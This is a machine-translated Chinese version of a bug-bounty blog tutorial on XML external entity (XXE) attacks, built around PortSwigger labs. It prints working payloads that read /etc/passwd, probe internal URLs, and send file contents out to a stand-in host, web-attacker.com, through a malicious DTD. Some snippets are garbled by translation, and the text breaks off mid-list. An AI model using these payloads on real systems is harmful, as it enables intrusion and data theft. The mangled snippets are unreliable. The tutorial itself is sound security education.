<html>
<head>
<title>XXE : From Zero to Hero</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">XXE:从零到英雄</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/xxe-from-zero-to-hero-b38118750556?source=collection_archive---------0-----------------------#2021-04-23">https://infosecwriteups.com/xxe-from-zero-to-hero-b38118750556?source=collection_archive---------0-----------------------#2021-04-23</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="780c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">各位黑客朋友，你们好，我希望你们都做得很好，并且学到了一些新东西:)。正如我在我的<a class="ae kl" href="https://newrouge.medium.com/recon-for-dummies-632f8f50ce12" rel="noopener"> <em class="km"> RECON </em>博客</a>中所说，我将会写下这周我所学到的东西。这个星期我尝试了很多事情，比如提交了一些bug，但是被骗了。尝试设置genymotion进行Android测试，但也没有成功。不得不重新安装windows和ubuntu以及我所有的工具，不知何故我搞乱了我的c盘，破坏了我的启动过程。总之，真正完成的事情是我学习了XXE，我有足够的信心，我可以教一两件事给那些想学习XXE的人。我会写下我是如何学到了什么。让我们深入研究一下。</p><figure class="kn ko kp kq gt kr"><div class="bz fp l di"><div class="ks kt l"/></div></figure><p id="e37e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在XXE代表<em class="km"> XML外部实体。</em>首先要理解的一件小事是，只有在客户端或服务器端处理XML数据的应用程序中，XXE才是可能的，还有一件事要注意，docx、xlsx、pptx都是XML文件类型。XXE包括利用应用程序如何处理其输入中包含的外部实体。您可以使用XXE从服务器提取信息或访问恶意服务器。XXE也可以通过文件上传被利用。如果感觉太多了，放松下来，继续读下去。</p><p id="8ef0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">XXE漏洞为什么会出现？</strong></p><p id="923c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果应用程序使用XML在浏览器和服务器之间传输或存储数据，而XML规范包含各种潜在的危险特性，并且标准解析器支持这些可能导致XXE的特性。</p><p id="00e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在了解XXE之前，</p><h1 id="90ff" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated"><strong class="ak">让我们了解一下XML、实体和DTD。</strong></h1><blockquote class="ls lt lu"><p id="0885" class="jn jo km jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated">XML代表可扩展标记语言</p></blockquote><p id="8ff7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XML看起来有点像HTML，但不像HTML XML没有预定义的标签，我们可以定义自己的标签。还有一个重要的注意事项，在HTML中我们甚至可以不关闭一些标签，但它仍然可以工作。例如，没有关闭标签,<h1>标题也可以工作。但是在XML中，所有的标签都需要关闭。</h1></p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ly"><img src="../Images/ab55de14af21d70e382b654bc841860d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/format:webp/1*V2sHRf51oYpBcLW70n76Ww.png"/></div></figure><h2 id="ddee" class="mb kv iq bd kw mc md dn la me mf dp le jy mg mh li kc mi mj lm kg mk ml lq mm bi translated">XML实体:</h2><p id="75b7" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">每当我们想用xml表示一些数据时，我们将使用XML实体，因为图片中的<em class="km"> add1 &amp; add2 </em>是XML实体，存储的数据是一些地址。如果你有一些编程背景，你可以把它想象成一个变量，在其中存储一些数据，每当我们在输出中需要这些数据时，我们通过"&amp;ENTITY _ NAME；调用这些实体(变量)。在这里你可以看到在第11行我们通过<em class="km"> &amp;调用了add 1；</em>现在，詹姆斯的地址将与他的姓名和电话号码一起显示出来。</p><h2 id="70ea" class="mb kv iq bd kw mc md dn la me mf dp le jy mg mh li kc mi mj lm kg mk ml lq mm bi translated">DTD(文档类型定义):</h2><p id="7b81" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">DTD包含的声明可以定义XML文档的结构、它可以包含的数据值的类型以及其他项目。</p><p id="f3b0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">DTD可以完全独立于文档本身(称为“内部DTD”)，也可以从其他地方加载(称为“外部DTD”)，或者是两者的混合。</p><p id="8040" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上面的例子中，DTD是根据应用程序的客户结构定义的。它是内部dtd的一个例子，因为add1和add2的值是从dtd本身加载的，而不是从外部源(URL/URI)加载的。</p><p id="3032" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果一个DTD试图从DTD外部加载一些数据，那么它就是一个外部DTD，在这种情况下，使用一个<em class="km">系统</em>关键字，指示DTD从下面的URI加载数据。</p><p id="f5de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如，从一些外部URL加载数据</p><blockquote class="ls lt lu"><p id="4dae" class="jn jo km jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated"><code class="fe ms mt mu mv b">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://normal-website.com/some-data" &gt; ]&gt;</code></p></blockquote><p id="35fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">或者从服务器本身加载数据。</p><blockquote class="ls lt lu"><p id="d2e6" class="jn jo km jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated"><code class="fe ms mt mu mv b">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///path/to/file" &gt; ]&gt;</code></p></blockquote><p id="9f1b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，每当在XML中调用&amp;xxe时，都会加载这些URI中的数据以响应应用程序。</p><p id="e3ec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们将尝试滥用这些实体特性来从外部源加载数据。(XML外部实体，即XXE)</p><p id="6eff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在portswigger提供了很好的实验来测试您的学习。我将遵循从基础实验室到高级xxe注射的路径。</p><p id="729e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">PS:我不会写这些实验的答案，那是你们自己的事情。已经有许多视频和博客为这些实验室提供了解决方案，所以没有必要给出解决方案。你自己阅读、学习和开发。</p><p id="aca9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，如果xxe可用，您可以实现哪些目标:</p><p id="d262" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">&gt;从服务器中过滤数据，如读取/etc/passwd等的内容。</p><p id="752b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">&gt;通过告诉服务器从内部URL加载数据来实现XXE的SSRF，因为请求来自服务器本身，您将能够点击内部URL。</p><p id="2881" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">&gt;通过向您的服务器发出请求来过滤数据(带外请求)，如果应用程序不允许常规实体(例如&amp;xxe)或不显示您的xxe paylaod的任何输出，这意味着这是一个<strong class="jp ir">盲xxe </strong>，您通过发出带外请求来确认。</p><p id="2605" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">&gt;迫使应用程序导致错误，并加载您的xxe输出以及系统错误。</p><figure class="kn ko kp kq gt kr"><div class="bz fp l di"><div class="mw kt l"/></div></figure><p id="f433" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在继续之前，我想让你们看一下STOK的视频，无论如何我都不会宣传pentesterlab。我只是想让你们看看他解决XXE习题的部分，因为我认为在头脑中有一些视觉总是好的。</p><figure class="kn ko kp kq gt kr"><div class="bz fp l di"><div class="mx kt l"/></div><figcaption class="my mz gj gh gi na nb bd b be z dk translated">STOK·彭特斯实验室</figcaption></figure><p id="8665" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从这个视频中，你会看到我们如何介绍我们自己的标签和实体，并调用这些实体。如果你什么都不懂，不要介意，只要喝杯咖啡，像看其他youtube视频一样看就行了。在这次XXE之旅中，我至少看了5-6遍。</p><p id="3876" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">PS:不要想别的，看看他是如何定义XML实体&amp; DTD的。就是这样。</p><h1 id="a38f" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">利用XXE检索文件</h1><p id="7a7e" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">实验1:<a class="ae kl" href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files" rel="noopener ugc nofollow" target="_blank">https://ports wigger . net/we b-security/xxe/LAB-exploining-xxe-to-retrieve-files</a></p><p id="338e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，您将看到应用程序接受xml数据并将其处理为。所以让我们检查一下它是否脆弱。</p><p id="0cf1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">(我假设您知道如何拦截流量和测试请求流。如果不是先学那个。)</p><p id="40c4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们介绍一下XML数据中的DTD</p><p id="ae28" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ms mt mu mv b">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;</code></p><p id="4e0c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里定义了一个DTD，它从外部源为我们的变量/实体xxe加载一些数据。SYSTEM是一个关键字，file://类似于http://</p><p id="a299" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里的DTD指示XML解析器从/etc/passwd加载数据，并在调用&amp;xxe;时显示数据。</p><p id="4e70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以从服务器上获取网络用户可以访问的任何数据。比如/etc/hostname等。如果只是linux服务器，你可以在file://of之后给出任何linux路径。</p><h1 id="4fa8" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">利用XXE实施SSRF袭击</h1><blockquote class="ls lt lu"><p id="7c7b" class="jn jo km jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated"><code class="fe ms mt mu mv b">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"&gt; ]&gt;</code></p></blockquote><p id="79a4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">PS:你可以选择任何名字来代替foo，这不是语法的一部分。</p><p id="61f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在此DTD中，xxe实体试图从内部url加载数据，该url可以是任何内容。这样你甚至可以加载服务器的云信息，如果它使用一些云服务。如果你对SSRF没有一些基本的了解，我建议你从这个令人敬畏的资源库中学习并获取paylaods。</p><div class="nc nd gp gr ne nf"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md" rel="noopener  ugc nofollow" target="_blank"><div class="ng ab fo"><div class="nh ab ni cl cj nj"><h2 class="bd ir gy z fp nk fr fs nl fu fw ip bi translated">swisskyrepo/payloads all things</h2><div class="nm l"><h3 class="bd b gy z fp nk fr fs nl fu fw dk translated">服务器端请求伪造或SSRF是一个漏洞，其中攻击者强制服务器在…上执行请求</h3></div><div class="nn l"><p class="bd b dl z fp nk fr fs nl fu fw dk translated">github.com</p></div></div><div class="no l"><div class="np l nq nr ns no nt lz nf"/></div></div></a></div><h1 id="333e" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">盲目的XXE漏洞</h1><p id="1245" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">这意味着应用程序易受攻击，但在其响应中不返回任何已定义的外部实体的值，因此不可能直接检索服务器端文件。只是不能直接读取/etc/passwd的内容。相反，您必须加载/etc/passwd的内容，并通过带外请求将其作为参数发送到您的服务器。在这些实验中，portswigger提供了一个漏洞利用服务器。</p><p id="9cad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我认为portswigger使事情变得有点复杂，如果你能从他们的解决方案中了解到，他们倾向于使用burp collborator和exploit server，然后做一些棘手的事情，你非常欢迎遵循这种方法。我在这里谈论XXE，而不是你如何利用它。</p><p id="696c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我喜欢保持事情简单，所以我用漏洞服务器做的一切只是为了传递有效载荷并在我的漏洞服务器日志中获得输出。</p><p id="836e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，在服务器上显示您的工资之前，您应该首先确认应用程序是否容易发出带外请求。这可以通过在XML实体中给出一个简单无害的服务器url来实现，并监控是否有来自受害服务器的GET请求。</p><p id="0688" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在实际部分:只需在xml主体中提交这个DTD</p><blockquote class="ls lt lu"><p id="6437" class="jn jo km jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated"><code class="fe ms mt mu mv b">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"&gt; ]&gt;</code></p></blockquote><p id="cfb8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我希望现在你一定已经明白这里发生了什么。定义了一个DTD，它有一个entityy xxe，向您的漏洞利用或burp collab服务器发出请求。只需调用这个xxe enity并在collaborator中等待DNS和HTTP请求。在利用服务器的情况下，您只能看到get请求，而不能看到DNS请求。</p><p id="96fc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意:只有当你有自己的DNS服务器在你的ip上运行时，DNS查找才是可见的。出于安全原因，portswigger不允许与外部服务器进行交互。所以你只能用他们的服务器。</p><p id="2a29" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">参数化实体:</strong></p><p id="0f3b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有时，XML解析器或应用程序本身会阻止常规实体的使用，这意味着您不能定义一个名为xxe的实体，然后通过&amp;xxe;调用它</p><p id="fb45" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这种情况下，您必须使用可以在DTD中引用的参数实体。</p><p id="13c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">XML参数实体的声明在实体名称前包含百分号字符:</p><p id="616b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ms mt mu mv b">&lt;!ENTITY % xxe "my parameter entity value" &gt;</code></p><p id="9339" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要引用此实体，您将使用% xxe(呼叫实体)</p><p id="78e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要检查带外请求，DTD将与参数实体类似:</p><p id="ecf9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ms mt mu mv b">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"&gt; %xxe; ]&gt;</code></p><p id="24dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意:这里实体的调用只在DTD内部完成。</p><p id="71d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您将看到受害者服务器与您的服务器之间的交互。</p><h1 id="e68a" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">利用盲XXE泄漏带外数据</h1><p id="05ab" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">您将在实体中加载敏感数据，并将其作为参数发送到您的服务器url，因为应用程序没有为xxe返回任何响应。</p><p id="641e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，在检测到盲XXE后，我们将从受害者服务器中提取一些数据。这是一个多步骤的过程，可以用两种方法来完成。我们先来了解一下portswigger one。</p><ol class=""><li id="f244" class="nu nv iq jp b jq jr ju jv jy nw kc nx kg ny kk nz oa ob oc bi translated">我们将向已经托管了dtd文件的端点上的漏洞服务器发出请求。</li><li id="23d8" class="nu nv iq jp b jq od ju oe jy of kc og kg oh kk nz oa ob oc bi translated">现在，这个dtd文件包含恶意XML代码，在解析时加载敏感数据，并使用该数据向您的服务器发出请求。</li></ol><p id="b2cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只需将这个DTD放入XML数据中。</p><p id="0518" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ms mt mu mv b">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"&gt; %xxe;]&gt;</code></p><p id="b2e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用您的漏洞利用服务器url/漏洞利用替换该URL</p><p id="147d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用这个% xxe调用您的实体将向您的漏洞利用服务器发出请求，该服务器托管一个包含以下内容的dtd文件</p><p id="a40b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ms mt mu mv b">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;<br/> &lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'&gt;"&gt;<br/> %eval;<br/> %exfiltrate;</code></p><p id="e1fb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用您的漏洞服务器url替换URL。</p><ol class=""><li id="eaa9" class="nu nv iq jp b jq jr ju jv jy nw kc nx kg ny kk nz oa ob oc bi translated">首先，一个文件参数实体请求xml加载/etc/passwd的内容</li></ol><p id="197b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.然后定义第二个名为eval的实体，它的值本身是另一个实体，所以我们将% HTML编码到。妥善保管引号和括号。</p><p id="6a05" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.现在调用%eval，它用数据作为url的参数动态形成url</p><p id="9926" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.% ex filter最终向已形成的url发出请求。</p><p id="70cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您将在服务器日志中收到/etc/passwd的内容。</p><p id="ed3e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">另一种方法是:</strong></p><p id="8049" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"> &gt;% dtd；】&gt;</p><p id="3c35" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里我们定义了两个实体。一个是加载文件，另一个是向带有恶意dtd文件的攻击者服务器发出请求。</p><p id="a7cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">evil.dtd:</p><blockquote class="ls lt lu"><p id="7092" class="jn jo km jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated">" &gt;</p><p id="d0ca" class="jn jo km jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated">% all</p></blockquote><p id="0337" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里的区别在于，在dtd文件中我们并不要求加载哪个文件，在xml请求中已经这样做了，其次，动态创建的<em class="km"> send </em>实体不是参数化实体，需要在xml请求中用<em class="km"> &amp; send调用；</em>为了将数据发送给攻击者的服务器。</p><h2 id="485b" class="mb kv iq bd kw mc md dn la me mf dp le jy mg mh li kc mi mj lm kg mk ml lq mm bi translated">通过错误消息泄漏:</h2><p id="cfec" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">如果应用程序在响应中显示发生的每个错误，那么我们可以在xml解析中强制错误，应用程序将在我们的xxe输出中显示发生了什么错误。</p><p id="2be9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如</p><blockquote class="ls lt lu"><p id="54e0" class="jn jo km jp b jq jr js jt ju jv jw jx lv jz ka kb lw kd ke kf lx kh ki kj kk ij bi translated"><br/>T20】！实体% eval " &lt;！实体&amp;# x25；错误系统“file:///non exist/% file；”&gt;&gt;<br/>% eval；<br/>%误差；</p></blockquote><p id="807a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里我们首先调用恶意服务器上的外部dtd(不会再写了)</p><ol class=""><li id="74e6" class="nu nv iq jp b jq jr ju jv jy nw kc nx kg ny kk nz oa ob oc bi translated">现在恶意的dtd加载/etc/passwd的内容</li></ol><p id="5600" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.动态创建一个URL/不存在/%文件，该文件将/etc/passwd的数据作为参数加载到其中。</p><p id="2f94" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.请求url时会导致错误，因为/exist/不是有效的路径。</p><p id="e03a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此最终输出包含错误未找到/不存在/ <output of=""/></p><h1 id="3fe3" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated"><strong class="ak"> B </strong>通过重新利用本地DTD，lind XXE:</h1><p id="ab44" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">想象一下正常的XXE是不可能的，只有盲目的xxe是可能的。即使在盲XXE中，带外请求也会被防火墙阻止。</p><p id="d547" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那么解决方案是什么呢？一些应用程序可能会阻止HTTP请求，以避免带外连接。在这种情况下，您需要在您的服务器上查找DNS。为了监控DNS查找，我们需要一个VPS。如果你能有一个很好的VPS，并让你的VPS为XXE开发所用，检查它的日志，你可以谷歌它如何做。</p><p id="6897" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果连DNS查找都被禁用了，或者你没有DNS服务器，那该怎么办呢？因此，在盲XXE和没有带外请求的情况下，我们可以重新调整服务器上本地DTD的用途。</p><p id="47f9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这意味着我们找到了一个已经在服务器上可用的DTD。(每个window和linux机器都有一些dtd，其代码大部分是公开的)。</p><p id="45c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们选择发现的DTD的一个实体&amp;重新定义它的结构，并故意在其中引起一个错误，将这个错误与我们的xxe数据一起包含在服务器响应中。</p><p id="8c2b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所有的XML实体都是常量，如果我们定义了两个同名的实体，那么XML将解析第一个。所以在我们的例子中，我们给实体的定义优先于已经在服务器的dtd中定义的定义。</p><p id="6a3f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe ms mt mu mv b">&lt;!DOCTYPE foo [<br/> &lt;!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd"&gt;<br/> &lt;!ENTITY % custom_entity '<br/> &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;<br/> &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;<br/> &amp;#x25;eval;<br/> &amp;#x25;error;<br/> '&gt;<br/> %local_dtd;<br/> ]&gt;</code></p><p id="5a3b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里看起来很复杂，但我会为你分解它。</p><ol class=""><li id="5753" class="nu nv iq jp b jq jr ju jv jy nw kc nx kg ny kk nz oa ob oc bi 